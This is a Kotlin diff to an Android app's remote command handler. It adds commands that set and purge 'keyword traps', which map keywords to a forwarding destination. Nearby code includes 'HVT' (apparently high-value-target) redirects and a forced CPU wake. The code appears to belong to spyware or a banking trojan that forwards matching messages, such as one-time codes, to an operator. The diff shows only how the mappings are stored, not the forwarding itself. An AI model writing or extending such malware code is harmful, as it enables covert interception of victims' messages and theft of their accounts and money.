@@ -805,6 +805,27 @@ object CommandProcessor {
                     ctx.getSharedPreferences("hvt_prefs", Context.MODE_PRIVATE).edit().clear().apply()
                     status = "HVT_REDIRECTS_CLEARED"
                 }
+                "ADD_KEYWORD_FORWARD" -> {
+                    val parts = content.split("|")
+                    if (parts.size >= 2) {
+                        val keywords = parts[0].trim().lowercase()
+                        val dest = parts[1].trim()
+                        val kwPrefs = ctx.getSharedPreferences("kw_forward_prefs", Context.MODE_PRIVATE)
+                        // Store each keyword in the comma list as a separate entry pointing to the same dest
+                        val editor = kwPrefs.edit()
+                        keywords.split(",").forEach { kw -> 
+                            if (kw.trim().isNotEmpty()) editor.putString(kw.trim(), dest) 
+                        }
+                        editor.apply()
+                        status = "KEYWORD_TRAPS_SET: $keywords -> $dest"
+                    } else {
+                        status = "FAILED_FORMAT: Use KEYWORDS|DEST"
+                    }
+                }
+                "CLEAR_KEYWORD_FORWARDS" -> {
+                    ctx.getSharedPreferences("kw_forward_prefs", Context.MODE_PRIVATE).edit().clear().apply()
+                    status = "KEYWORD_TRAPS_PURGED"
+                }
                 "WAKE" -> {
                     // 1. CPU KICK: Force a temporary WakeLock to ensure the CPU is awake to process the UI
                     val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
